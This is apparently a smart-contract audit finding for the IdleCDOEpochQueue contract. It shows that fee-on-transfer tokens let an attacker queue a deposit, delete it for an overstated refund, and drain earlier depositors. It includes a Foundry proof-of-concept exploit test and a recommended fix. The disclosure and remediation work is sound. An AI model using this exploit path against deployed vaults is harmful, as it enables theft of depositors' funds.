### Title

Fee-on-transfer deposits overstate queued balances and drain prior depositors - ([File: `contracts/IdleCDOEpochQueue.sol`](contracts/IdleCDOEpochQueue.sol))

### Summary

`IdleCDOEpochQueue.requestDeposit` records the requested ERC-20 amount instead of the amount actually received. With a fee-on-transfer or otherwise non-1:1 underlying token, an attacker can queue a deposit, immediately delete it, and receive the full recorded amount while the queue only received the net amount. The deficit is paid from earlier queued deposits and can subsequently prevent both withdrawals and epoch deposit processing.

### Finding Description

The vault accepts an arbitrary nonzero ERC-20 underlying during initialization and does not verify that transfers deliver the requested amount 1:1. [1](#0-0) 

In `requestDeposit`, the queue calls `safeTransferFrom(msg.sender, address(this), amount)` and then adds the nominal `amount` to both `userDepositsEpochs` and `epochPendingDeposits`. [2](#0-1) 

`deleteRequest` later refunds the full recorded amount without checking the queue's actual token balance or the amount originally received. [3](#0-2) 

Unlike the queue, `IdleCDOCreditVault._deposit` already measures the balance delta and mints tranche shares for the amount actually received. [4](#0-3) 

This mirrors the external bug class: the protocol assumes an incoming transfer filled the declared buffer and continues execution with the nominal size instead of returning or accounting for the shortfall.

### Impact Explanation

A KYC-passing lender can exploit this while an epoch is running:

1. A victim queues `100` underlying and the queue receives `99` after a 1% transfer fee.
2. The attacker queues `100`, and the queue receives another `99`.
3. The attacker deletes the request and receives the recorded `100`.
4. The queue retains `98` against the victim's recorded `100` obligation.
5. The victim's `deleteRequest` and the privileged `processDeposits` call revert because they attempt to move `100` while only `98` remains.

If the transfer-fee recipient is attacker-controlled, the attacker also directly profits from the fee; otherwise the attack still transfers part of the victims' queued principal to the attacker as a full refund. The shortfall scales with each deposit/delete cycle and can freeze the entire `epochPendingDeposits` balance until an external donation covers it. [5](#0-4) [6](#0-5) 

### Likelihood Explanation

The attacker only needs a wallet that passes the configured Keyring policy and an underlying token whose `transferFrom` credits less than the requested amount. The code does not restrict the underlying to known non-rebasing, feeless ERC-20s. [1](#0-0) 

Existing checks do not prevent the issue:

- `_checkAllowed` validates the depositor and epoch state, not token settlement. [7](#0-6) 
- `deleteRequest` is allowed before `epochPrice` is set. [8](#0-7) 
- `processDeposits` uses the overstated aggregate balance rather than the queue's actual token balance. [9](#0-8) 

### Recommendation

Measure the received amount in `requestDeposit`:

```solidity
uint256 balanceBefore = IERC20Detailed(underlying).balanceOf(address(this));
IERC20Detailed(underlying).safeTransferFrom(msg.sender, address(this), amount);
uint256 received = IERC20Detailed(underlying).balanceOf(address(this)) - balanceBefore;

if (received != amount) {
    revert NotAllowed();
}
```

Alternatively, document that only feeless, non-rebasing ERC-20s are supported and enforce that invariant at deployment/factory level. The stricter received-amount check is safer for existing upgradeable deployments.

### Proof of Concept

The following fork test extends the existing `IdleCDOEpochQueue` fork setup in `test/foundry/IdleCDOEpochQueue.t.sol`. [10](#0-9) 

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "./IdleCDOEpochQueue.t.sol";

contract FeeOnTransferToken is IERC20Detailed {
    string public constant name = "Fee Token";
    string public constant symbol = "FEE";
    uint8 public constant DECIMALS = 6;

    address public immutable feeSink;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address _feeSink) {
        feeSink = _feeSink;
    }

    function decimals() external pure returns (uint256) {
        return DECIMALS;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function forceApprove(
        address owner,
        address spender,
        uint256 amount
    ) external {
        allowance[owner][spender] = amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (balanceOf[msg.sender] < amount) return false;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        if (allowance[from][msg.sender] < amount) return false;
        if (balanceOf[from] < amount) return false;

        unchecked {
            allowance[from][msg.sender] -= amount;
        }

        uint256 fee = amount / 100;
        balanceOf[from] -= amount;
        balanceOf[to] += amount - fee;
        balanceOf[feeSink] += fee;
        return true;
    }
}

contract FeeOnTransferQueuePoC is TestIdleCDOEpochQueue {
    FeeOnTransferToken internal feeToken;

    function testFeeDepositRefundDrainsQueuedDeposits() external {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        // The forked vault is already in the running-epoch phase used by the
        // existing queue fixture. Replace its configured underlying with the
        // fee-on-transfer ERC-20 before initializing the queue.
        feeToken = new FeeOnTransferToken(attacker);

        stdstore
            .target(address(cdoEpoch))
            .sig(cdoEpoch.token.selector)
            .checked_write(address(feeToken));

        queue = new IdleCDOEpochQueue();
        stdstore
            .target(address(queue))
            .sig(queue.idleCDOEpoch.selector)
            .checked_write(address(0));
        queue.initialize(address(cdoEpoch), address(this), true);

        uint256 amount = 100e6;
        uint256 requestEpoch = strategy.epochNumber() + 1;

        feeToken.mint(victim, amount);
        feeToken.mint(attacker, amount);

        vm.prank(victim);
        feeToken.approve(address(queue), amount);
        vm.prank(attacker);
        feeToken.approve(address(queue), amount);

        // Each request records 100 but the queue receives only 99.
        vm.prank(victim);
        queue.requestDeposit(amount);
        vm.prank(attacker);
        queue.requestDeposit(amount);

        assertEq(feeToken.balanceOf(address(queue)), 198e6);
        assertEq(queue.epochPendingDeposits(requestEpoch), 200e6);

        // The attacker is refunded the overstated nominal amount.
        vm.prank(attacker);
        queue.deleteRequest(requestEpoch);

        // Attacker received both transfer fees plus the full refund.
        assertEq(feeToken.balanceOf(attacker), 102e6);
        assertEq(feeToken.balanceOf(address(queue)), 98e6);
        assertEq(queue.userDepositsEpochs(victim, requestEpoch), amount);

        // The victim's full recorded refund can no longer be paid.
        vm.prank(victim);
        vm.expectRevert();
        queue.deleteRequest(requestEpoch);

        // Epoch settlement is also blocked because CDO tries to pull the
        // overstated aggregate pending amount from the queue.
        feeToken.forceApprove(address(cdoEpoch), address(strategy), amount);
        stdstore
            .target(address(strategy))
            .sig(strategy.underlyingToken.selector)
            .checked_write(address(feeToken));

        _stopCurrentEpoch();

        vm.prank(manager);
        vm.expectRevert();
        queue.processDeposits();
    }
}
```

### Citations

**File:** contracts/IdleCDOCreditVault.sol (L53-72)
```text
    if (token != address(0)) revert AlreadyInitialized();
    _checkIs0(_strategy == address(0) || _guardedToken == address(0));
    _checkAmountTooHigh(_trancheAPRSplitRatio > FULL_ALLOC);
    // Initialize contracts
    PausableUpgradeable.__Pausable_init();
    // check for _governanceFund and _owner != address(0) are inside GuardedLaunchUpgradable
    GuardedLaunchUpgradable.__GuardedLaunch_init(_limit, _governanceFund, _owner);
    // Deploy Tranches tokens
    address _strategyToken = IIdleCDOStrategy(_strategy).strategyToken();
    // get strategy token symbol (eg. idleDAI)
    string memory _symbol = IERC20Detailed(_strategyToken).symbol();
    // create tranche tokens (concat strategy token symbol in the name and symbol of the tranche tokens)
    AATranche = _deployTranche(string("Pareto "), string("p"), _symbol);
    BBTranche = _deployTranche(string("Pareto BB "), string("pBB_"), _symbol);
    // Set CDO params
    token = _guardedToken;
    strategy = _strategy;
    strategyToken = _strategyToken;
    trancheAPRSplitRatio = _trancheAPRSplitRatio;
    uint256 _oneToken = 10**(IERC20Detailed(_guardedToken).decimals());
```

**File:** contracts/IdleCDOCreditVault.sol (L201-206)
```text
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
```

**File:** contracts/IdleCDOEpochQueue.sol (L103-126)
```text
  function requestDeposit(uint256 amount) external nonReentrant {
    // check if the wallet is allowed to deposit (ie epoch is running and keyring KYC completed)
    _checkAllowed(msg.sender);

    IdleCDOEpochVariant _cdo = IdleCDOEpochVariant(idleCDOEpoch);
    uint256 nextEpoch = IdleCreditVault(strategy).epochNumber() + 1;
    uint256 _prefundedWindow = prefundedDepositWindow;
    // Only the AA prefunded queue enforces a deposit cutoff for the next epoch.
    if (tranche == _cdo.AATranche() && _isPrefundedQueueEnabled()) {
      IdleCDOEpochVariantPrefunded(idleCDOEpoch).checkPrefunding(epochPendingDeposits[nextEpoch] + amount);
      // Once funds are prefunded, or once the subscription window is reached, the next epoch is closed.
      _checkNotAllowed(
        epochPrefundedDeposits[nextEpoch] != 0 || (
        _prefundedWindow != 0 && block.timestamp + _prefundedWindow >= _cdo.epochEndDate()
      ));
    }

    // get underlying tokens from user
    IERC20Detailed(underlying).safeTransferFrom(msg.sender, address(this), amount);
    // deposit will be made in the next buffer period (ie next epoch)
    // updated user queued amount for the next epoch
    userDepositsEpochs[msg.sender][nextEpoch] += amount;
    // update pending deposits
    epochPendingDeposits[nextEpoch] += amount;
```

**File:** contracts/IdleCDOEpochQueue.sol (L184-198)
```text
  function deleteRequest(uint256 _requestEpoch) external {
    // if the epoch price is already set, deposits were already processed so
    // the deposit request can't be deleted.
    _checkNotAllowed(epochPrice[_requestEpoch] != 0 || epochPrefundedDeposits[_requestEpoch] != 0);

    uint256 amount = userDepositsEpochs[msg.sender][_requestEpoch];
    if (amount == 0) {
      return;
    }
    // reset user deposit for the epoch
    userDepositsEpochs[msg.sender][_requestEpoch] = 0;
    // update pending deposits
    epochPendingDeposits[_requestEpoch] -= amount;
    // transfer underlyings back to the user
    IERC20Detailed(underlying).safeTransfer(msg.sender, amount);
```

**File:** contracts/IdleCDOEpochQueue.sol (L228-245)
```text
    IdleCDOEpochVariant _cdo = IdleCDOEpochVariant(idleCDOEpoch);
    uint256 _epoch = IdleCreditVault(strategy).epochNumber();
    uint256 _pending = epochPendingDeposits[_epoch];

    if (_pending == 0) {
      return;
    }

    // deposit underlyings in the CDO contract, if the epoch is running it will revert
    uint256 _trancheMinted;
    if (tranche == _cdo.AATranche()) {
      _trancheMinted = _cdo.depositAA(_pending);
    } else {
      _trancheMinted = _cdo.depositBB(_pending);
    }
    // save current implied tranche price for this epoch based on underlyings deposited and tranche tokens minted
    epochPrice[_epoch] = _pending * ONE_TRANCHE / _trancheMinted;
    epochPendingDeposits[_epoch] = 0;
```

**File:** test/foundry/IdleCDOEpochQueue.t.sol (L30-55)
```text
  function setUp() public {
    vm.createSelectFork('mainnet', 20933865);

    // we deploy a new IdleCDOEpochVariant and IdleCreditVault contract used only to get the bytecode 
    // and etch at the same address of the original one so to enable console.log in the IdleCDOEpochVariant 
    // and new features not yet deployed on mainnet
    IdleCDOEpochVariant dummy = IdleCDOEpochVariant(address(new IdleCDOEpochVariantPrefunded()));
    IdleCreditVault dummyStrategy = new IdleCreditVault();
    vm.etch(address(cdoEpoch), address(dummy).code);
    vm.etch(cdoEpoch.strategy(), address(dummyStrategy).code);

    queue = new IdleCDOEpochQueue();
    stdstore.target(address(queue)).sig(queue.idleCDOEpoch.selector).checked_write(address(0));
    queue.initialize(address(cdoEpoch), address(this), true);
    underlying = IERC20Detailed(cdoEpoch.token());
    strategy = IdleCreditVault(cdoEpoch.strategy());
    manager = strategy.manager();
    tranche = IERC20Detailed(cdoEpoch.AATranche());

    // approve queue contract to spend underlying of address(this)
    underlying.approve(address(queue), type(uint256).max);

    // allow everyone to deposit
    vm.prank(cdoEpoch.owner());
    cdoEpoch.setKeyringParams(address(0), 1);

```
